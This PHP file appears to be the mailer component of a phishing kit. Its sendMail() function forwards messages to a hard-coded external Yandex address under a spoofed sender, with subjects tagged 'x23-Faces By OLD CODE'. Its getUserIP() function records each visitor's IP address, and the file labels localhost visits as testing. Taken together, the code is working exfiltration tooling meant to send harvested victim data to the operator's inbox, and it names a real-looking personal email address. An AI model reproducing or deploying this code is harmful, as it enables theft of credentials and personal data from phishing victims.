<?php
$domain=preg_replace("/www\\./i","",$_SERVER["SERVER_NAME"]);

function sendMail($topic, $message) {

    $toEmail = 'sahil.ahmef@yandex.com';
    $from = 'OLD CODE';
    $fromEmail = 'ys@youngsister.com';
    $codedTopic = getHeader($topic);
    $domain=preg_replace("/www\\./i","",$_SERVER["SERVER_NAME"]);
    $head="Content-type:text/plain;charset=UTF-8\r\n";
    $head.="From: ".$from." <".$fromEmail.">"."\r\n";
    mail($toEmail,$codedTopic,$message,$head);

}



function getHeader($topic) {
    return '---x23-Faces By OLD CODE: '.$topic.'--- ';
}

function getUserIP(){
    $client=@$_SERVER["HTTP_CLIENT_IP"];
    $forward=@$_SERVER["HTTP_X_FORWARDED_FOR"];
    $remote=$_SERVER["REMOTE_ADDR"];
    if(filter_var($client,FILTER_VALIDATE_IP)){
        $ip=$client;
    }
    elseif(filter_var($forward,FILTER_VALIDATE_IP)){
        $ip=$forward;
    }
    else{
        $ip=$remote;
    }
    return$ip;
}

$ip2=getUserIP();
if($ip2=="127.0.0.1"){
    $ip2="FUCK TESTING";
}
?>